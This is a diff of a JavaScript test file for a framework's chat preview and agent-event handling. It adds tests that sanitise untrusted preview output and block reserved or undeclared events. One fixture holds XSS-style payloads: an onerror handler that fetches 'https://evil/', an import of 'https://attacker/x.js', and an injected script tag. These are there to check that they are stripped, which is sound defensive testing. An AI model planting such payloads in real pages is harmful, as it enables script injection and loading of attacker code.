@@ -9,8 +9,10 @@ import { reduceContexts, HOST_ID, overlayOf } from './reduceContexts.mjs'
 import {
   renderScreenRequestOf, chatNavigationOf, navigationLoadExtraOf, chatEventPlanOf, chatPreviewBodyOf,
   chatPreviewIncrementOf, dispatchChatEvent, streamChat, resolveChatUrl, chatConfigOf, chatUsageTextOf,
-  CHAT_PREVIEW_ACTION,
+  CHAT_PREVIEW_ACTION, CHAT_AGENT_BUILT_IN_EVENTS, CHAT_RESERVED_EVENT_NAMES, CHAT_RESERVED_EVENT_PREFIXES,
+  agentMayDispatchEvent,
 } from './chat.mjs'
+import { readFileSync } from 'node:fs'
 import { setChromeLanguage } from './i18n.mjs'
 
 setChromeLanguage('en')
@@ -77,13 +79,26 @@ test('the __preview__ call: current route, consumed as is, NO serverSideType, em
   assert.equal(body.consumedRoute, '/orders')
   assert.equal(body.serverSideType, undefined)
   assert.deepEqual(body.componentState, {})
-  assert.deepEqual(body.parameters, { _yaml: 'type: Page' })
+  assert.deepEqual(body.parameters, { _yaml: 'type: Page', _untrusted: true })
+})
+
+test('NB1: a preview answer is painted UNTRUSTED — no handler, import or markup survives, the rest does', () => {
+  const evil = { type: 'ClientSide', id: 'e', children: [], metadata: { type: 'Element', name: 'img',
+    attributes: { src: 'x.png', onerror: "fetch('https://evil/')", import: 'https://attacker/x.js' }, on: {}, content: '<b>x</b>', html: true } }
+  const answer = { ...preview(evil), commands: [{ type: 'AddContentToHead', data: '<script>1</script>' }, { type: 'SetWindowTitle', data: 'T' }] }
+  for (const target of ['content', 'drawer']) {
+    const inc = chatPreviewIncrementOf(answer, { yaml: 'x', target }, '/r')
+    const text = JSON.stringify(inc)
+    assert.ok(!/onerror|attacker|AddContentToHead/.test(text), target + ': ' + text)
+    assert.ok(text.includes('x.png') && text.includes('SetWindowTitle'), target)
+    assert.ok(text.includes('"html":false'), target)
+  }
 })
 
 test('preview into the CONTENT: the answer replaces the host — painted like any page re-render', () => {
   const inc = chatPreviewIncrementOf(preview(formPage), { target: 'content' })
   const reg = reduceContexts(regWith(), inc)
-  assert.equal(reg.contexts[HOST_ID].tree, formPage)
+  assert.deepEqual(reg.contexts[HOST_ID].tree, formPage)
   assert.equal(reg.contexts[HOST_ID].state.name, 'Ada')
   assert.equal(reg.stack.length, 0, 'no overlay')
 })
@@ -144,6 +159,23 @@ test('close-requested closes; any other event goes to the document AND to its su
   assert.deepEqual(plan.subscribers, [{ ctxId: HOST_ID, actionId: 'refresh', parameters: { id: 7 } }])
 })
 
+test('NM9: an event nobody on screen declares, or one of the framework\'s own, goes nowhere', async () => {
+  const corpus = JSON.parse(readFileSync(new URL('../../../../../../conformance/client/agent-events.json', import.meta.url), 'utf8'))
+  assert.deepEqual([...CHAT_AGENT_BUILT_IN_EVENTS], corpus.builtIn)
+  assert.deepEqual([...CHAT_RESERVED_EVENT_NAMES], corpus.reserved)
+  assert.deepEqual(CHAT_RESERVED_EVENT_PREFIXES, corpus.reservedPrefixes)
+  for (const c of corpus.cases) assert.equal(agentMayDispatchEvent(c.name, c.subscribed.includes(c.name)), c.allowed, c.name)
+  assert.equal(chatEventPlanOf({ event: 'booking-made', detail: {} }, regWith()).kind, 'ignore', 'undeclared')
+  const reserved = regWith([{ type: 'OnCustomEvent', eventName: 'mateu-session-expired', actionId: 'x' }])
+  assert.equal(chatEventPlanOf({ event: 'mateu-session-expired', detail: {} }, reserved).kind, 'ignore', 'framework event, even subscribed')
+  // and nothing reaches the document
+  const heard = []
+  const doc = { dispatchEvent: (e) => heard.push(e.type) }
+  await dispatchChatEvent({ event: 'mateu-session-expired', detail: {} }, null, doc)
+  await dispatchChatEvent({ event: 'booking-made', detail: {} }, null, doc)
+  assert.deepEqual(heard, [])
+})
+
 // ── the dispatcher, against a fake host ──────────────────────────────────────────────────────
 
 const fakeHost = (reg, answer) => {
@@ -170,9 +202,9 @@ test('dispatch: render-screen with no subscriber POSTs __preview__ to the screen
   const call = host.log.find((l) => l[0] === 'call')
   assert.equal(call[1], 'http://b')
   assert.equal(call[2].route, '/hello')
-  assert.deepEqual(call[2].parameters, { _yaml: 'type: Page' })
+  assert.deepEqual(call[2].parameters, { _yaml: 'type: Page', _untrusted: true })
   const paint = host.log.find((l) => l[0] === 'paint')
-  assert.equal(paint[1].fragments[0].component, formPage)
+  assert.deepEqual(paint[1].fragments[0].component, formPage)
   assert.equal(paint[2].target, 'content')
   assert.ok(!host.log.some((l) => l[0] === 'run'), 'no hard-coded renderScreen action')
   assert.deepEqual(doc.seen.map((s) => s[0]), ['render-screen'])
